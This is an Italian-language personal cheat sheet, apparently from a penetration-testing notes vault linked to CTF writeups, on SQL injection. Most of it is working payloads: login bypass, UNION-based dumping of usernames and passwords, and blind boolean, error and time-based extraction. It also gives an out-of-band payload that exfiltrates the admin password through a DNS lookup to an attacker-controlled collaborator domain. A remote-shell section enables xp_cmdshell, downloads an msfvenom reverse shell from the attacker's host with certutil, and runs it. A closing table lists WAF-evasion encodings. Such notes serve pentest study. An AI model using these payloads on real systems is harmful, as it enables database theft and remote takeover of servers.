#Exploit_noti 

---
---
---
#### INDICE
- [[#Introduzione]]
- [[#Enumerazione]]
- [[#Login Bypass]]
- [[#Classic SQLi (visibile)]]
- [[#Second-order SQLi]]
- [[#Attacco UNION]]
	1. [[#STEP 1 - Determinare il numero di colonne]]
	2. [[#STEP 2 - Trovare colonne compatibili con dati testuali]]
	3. [[#STEP 3 - Raccolta Informazioni sul DB]]
	4. [[#STEP 4 - Recuperare dati da altre tabelle]]
	5. [[#STEP 5 - Concatenazione in una singola colonna]]
- [[#Blind SQL Injection]]
	1. [[#Blind SQLi con Risposte Condizionali]]
	2. [[#Blind SQLi con Errori Condizionati]]
	3. [[#Blind SQLi Time-Based]]
	4. [[#Blind SQLi Out-of-Band (OAST)]]
- [[#Caricare una shell in remoto]]
- [[#Sintassi specifica per DBMS]]
- [[#Contesti alternativi]]
	1. [[#Contesti alternativi di input SQLi]]
	2. [[#Esempio con XML Injection]]
	3. [[#Bypass WAF tramite encoding]]
- [[#Bypass Filtri e WAF]]
- [[#Tabella cheatsheet]]

---
---
---
### Introduzione
**SQL Injection (SQLi)** √® una vulnerabilit√† che consente a un attaccante di interferire con le query SQL eseguite dall‚Äôapplicazione. Tramite l‚Äôinserimento controllato di input malevolo, √® possibile:
- accedere a dati non autorizzati (es. credenziali, info personali);
- bypassare l‚Äôautenticazione;
- modificare o eliminare contenuti del database;
- eseguire comandi arbitrari sul DBMS;
- in alcuni casi, ottenere accesso al sistema sottostante.

---
### Enumerazione
Inserire uno dei seguenti input dove potenzialmente sono presenti chiamate al database:
- `'`
- `OR 1=1`
- `OR 1=2`
- `3-1`

Se la risposta del server tarder√†, generer√† errore o risolver√† l'operazione aritmetica allora √® probabile che venga utilizzato un linguaggio SQL.

---
### Login Bypass
Di fronte ad un'interfaccia di login si pu√≤ provare ad inserire in input:

```
'--
```

La query diventer√†:

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Il commento SQL `--` tronca il resto della query. 

üìö Writeups:
- *Linux:* [[Linux#Cockpit| Cockpit]],[[Linux#GameZone| GameZone]],

---
### Classic SQLi (visibile)
Il risultato della query viene **mostrato direttamente** nella risposta dell‚Äôapplicazione.  
Esempio:

```
https://site.com/products?category=Gifts'--
```

SQL generata:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Il commento SQL `--` tronca il resto della query. Tutti i prodotti, anche non rilasciati, vengono mostrati.

üìö Writeups:
- *Linux:* [[Linux#Jarvis| Jarvis]],[[Linux#Pebbles| Pebbles]],[[Linux#Hawat| Hawat]],[[Linux#DailyBugle| DailyBugle]],[[Linux#Quackerjack| Quackerjack]],[[Linux#Usage| Usage]],

---
### Second-order SQLi
L‚Äôiniezione avviene in un punto, ma **l‚Äôeffetto si manifesta in seguito** quando il dato viene riutilizzato in una query:

```
INSERT INTO users (name) VALUES ('payload')  -- Registrazione sicura
SELECT * FROM audit WHERE user = 'payload'`  -- Uso futuro non sanitizzato
```

üìö Writeups:
- *Windows:*[[Windows#MedJed| MedJed]], 

---
### Attacco UNION
#### STEP 1 - Determinare il numero di colonne
Due approcci principali:

Prova fino a ricevere errore o risposta diversa:

```
' ORDER BY 1--   
' ORDER BY 2--
...
' ORDER BY N-- 
```

Un errore come _"position number out of range"_ indica che hai superato il numero reale.

Oppure:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
...
' UNION SELECT NULL,NULL,...,NULL--
```

Il payload avr√† successo quando il numero di colonne corrisponde.
#### STEP 2 - Trovare colonne compatibili con dati testuali
Una volta trovato il numero di colonne corretto, identifica **quale colonna pu√≤ contenere testo**:

```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--`  
```

Se non ottieni errore e vedi la lettera `'a'` nella risposta, quella colonna √® adatta per mostrare dati stringa.
#### STEP 3 - Raccolta Informazioni sul DB
Una volta ottenuta una SQLi, cerca di scoprire:

- Versione DB:

```
SELECT @@version            -- MySQL
SELECT version()            -- PostgreSQL 
SELECT * FROM v$version     -- Oracle
```

- Tabelle e colonne:

```
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

#### STEP 4 - Recuperare dati da altre tabelle
Supponiamo che:
- ci siano **2 colonne**;
- siano compatibili con dati testuali;
- il DB abbia una tabella `users(username, password)`.

Allora puoi usare:

```
' UNION SELECT username, password FROM users--
``` 

I dati vengono visualizzati nella risposta HTML, JSON o raw.
#### STEP 5 - Concatenazione in una singola colonna

Se puoi visualizzare **solo una colonna**, concatena i valori:

```
' UNION SELECT username || '~' || password FROM users--      -- Oracle
' UNION SELECT CONCAT(username, ':', password) FROM users--  -- MySQL 
```

Output esempio:

```
admin~hunter2
valerio:qwerty123
```

üìö Writeups:
- *Linux:* [[Linux#Jarvis| Jarvis]],

---
### Blind SQL Injection
La **Blind SQL Injection** si verifica quando l‚Äôapplicazione √® vulnerabile a SQLi, ma non restituisce direttamente il risultato della query SQL n√© errori espliciti nel corpo della risposta.  
Anche se l‚Äôoutput non √® visibile, √® possibile dedurre l‚Äôesito delle query SQL osservando variazioni nella risposta dell'applicazione, come contenuto HTML, codici HTTP o tempi di risposta.

#### Blind SQLi con Risposte Condizionali
Esempio classico:

```
Cookie: TrackingId=cookie' AND '1'='1  --> Risposta contiene: Welcome back
Cookie: TrackingId=cookie' AND '1'='2  --> Nessuna risposta speciale
```

Puoi costruire test binari per estrarre dati _bit per bit_ o _carattere per carattere_ basandoti sulla risposta "Welcome back" data dall'applicazione web.

Per l'estrazione password si procede allo stesso modo:

```
cookie' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a'--`
```

Ripeti il confronto per ogni carattere cambiando `'a'` fino a ricostruire l‚Äôintera stringa.

---
#### Blind SQLi con Errori Condizionati
Alcune app non cambiano il comportamento se la query restituisce 0 o 1 risultati, ma **rispondono diversamente se avviene un errore SQL**.

Esempio:

```
cookie' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--  --> Divide by zero
cookie' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--  --> Nessun errore
```

Se la risposta cambia solo con `1/0`, puoi usarla per estrarre informazioni condizionali.
#### Blind SQLi Time-Based

Quando l'app **gestisce gli errori silenziosamente**, si pu√≤ sfruttare la sincronizzazione del server per misurare **ritardi deliberati**.

Esempio (MS SQL Server):

```
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (1=2) WAITFOR DELAY '0:0:5'--
```

La differenza nel tempo di risposta indica il valore della condizione.  
Puoi usare questo metodo per:
- determinare la **lunghezza della password**
- confrontare **caratteri singoli**
- iterare su colonne, tabelle, contenuti
#### Blind SQLi Out-of-Band (OAST)
Se nessuna delle tecniche precedenti funziona (es. query asincrona, risposta fissa), puoi usare **interazioni di rete esterne** (DNS, HTTP) per **esfiltrare dati tramite canali out-of-band.**

Strumento consigliato: **Burp Collaborator**.

Esempio (MS SQL Server):

```
; use master; exec xp_dirtree '\\IP_ATTACCANTE\hack';--
```

```
impacket-smbserver hack $(pwd)
```

Oppure per esfiltrare dati reali:

```
'; DECLARE @p VARCHAR(1024);
SET @p=(SELECT password FROM users WHERE username='admin');
EXEC('master..xp_dirtree "//'+@p+'.your-subdomain.burpcollaborator.net/a"')--
```

[[üî° Glossario#Burp Suite| Burp¬∞]] registrer√† la lookup DNS contenente la password.

üìö Writeups:
- *Windows:*[[Linux#Giddy| Giddy]],

---
### Caricare una shell in remoto
Se un servizio √® vulnerabile a SQLi allora possiamo caricare una shell.

Creiamo la shell da caricare: 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_KALI> LPORT=80 -f exe -o shell.exe
```

Abilitiamo la shell:

```
'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -
```

Carichiamo la shell in remoto, creata nel primo passaggio:

```
';exec xp_cmdshell 'certutil -urlcache -f http://<IP_KALI>/shell.exe c:/temp/shell.exe';--
```

Eseguiamo la shell:

```
';exec xp_cmdshell 'c:/temp/shell.exe';--
```


---
### Sintassi specifica per DBMS
**Oracle**: usa `FROM DUAL` per query senza tabella.

```
' UNION SELECT NULL FROM DUAL--
``` 

**MySQL**: `--` deve essere seguito da uno spazio (`--` ), oppure usa `#`.
**PostgreSQL**: supporta anche `--` e `/* */`.
**SQL Server**: pu√≤ supportare anche `WAITFOR DELAY` per time-based.

Per concatenare stringhe:

| DB         | Sintassi       |
| ---------- | -------------- |
| MySQL      | `CONCAT(a, b)` |
| Oracle     | `a             |
| SQL Server | `a + b`        |
| PostgreSQL | `a             |

---
### Contesti alternativi
Nel mondo reale, le vulnerabilit√† SQLi non si limitano solo alla **query string** (`GET` o `POST`) di una URL. Qualsiasi **input controllabile dall‚Äôutente** che viene passato senza sanificazione a una query SQL rappresenta un potenziale vettore d'attacco.
#### Contesti alternativi di input SQLi
Questi sono alcuni degli input spesso vulnerabili a SQLi:
- Corpo JSON (`application/json`)
- Payload XML (`application/xml` o `text/xml`)
- Header HTTP (es: `User-Agent`, `Referer`)
- Cookie
- URL path segments (`/api/users/1`)
- WebSocket messages

In ambienti **API-based** o **modern web app**, XML/JSON sono vettori comuni e spesso trascurati nelle validazioni server-side.
#### Esempio con XML Injection
Un‚Äôapplicazione potrebbe accettare una richiesta in formato XML per controllare l‚Äôinventario:

```
<stockCheck>     
	<productId>123</productId>     
	<storeId>999</storeId>
</stockCheck>
```

Un attaccante pu√≤ manipolare il contenuto di `<storeId>` per eseguire una query malformata:

```
`<stockCheck>
	<productId>123</productId>
	<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

Qui `&#x53;` corrisponde a `S` in esadecimale, formando di fatto la parola `SELECT`, che **verr√† decodificata lato server** e interpretata come parte della query.
#### Bypass WAF tramite encoding
Molti Web Application Firewall (WAF) rilevano payload SQLi tramite pattern statici (`SELECT`, `' OR 1=1--`, ecc.).  
Tuttavia, in contesti **non HTML**, gli input possono essere:

- **Offuscati** con encoding esadecimale/Unicode:
    - `' UNION &#x53;ELECT` (S)
    - `%55nion%20Select` (URL encoded)
- **Distribuiti** su pi√π tag/parametri
- **Splittati** con commenti o concatenazioni

L‚Äôuso di XML e JSON permette di ‚Äúnascondere‚Äù query malevole in formati che non tutti i filtri trattano correttamente.

---
### Bypass Filtri e WAF
Per aggirare filtri o firewall:

| Tecnica            | Esempio                  |
| ------------------ | ------------------------ |
| Codifica           | `%27` al posto di `'`    |
| Spazi alternativi  | `/**/`, `%0a`, `%09`     |
| Commenti           | `UN/**/ION`              |
| Encoding XML       | `&#x53;ELECT`            |
| Case variation     | `SeLeCt`                 |
| JSON/XML injection | Vettori meno controllati |

---
### Tabella cheatsheet

|Tecnica|Descrizione|
|---|---|
|`' OR '1'='1`|Bypass login|
|`' UNION SELECT ...`|Esfiltrazione di dati da altre tabelle|
|`' AND 1=1--` / `1=2--`|Boolean-based blind|
|`SLEEP(5)`|Time-based blind|
|`UNION SELECT NULL,...`|Enumerazione colonne|
|`ORDER BY n`|Scoperta numero colonne|
|`OAST DNS query`|Esfiltrazione out-of-band|

Altri [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet0) consigliati.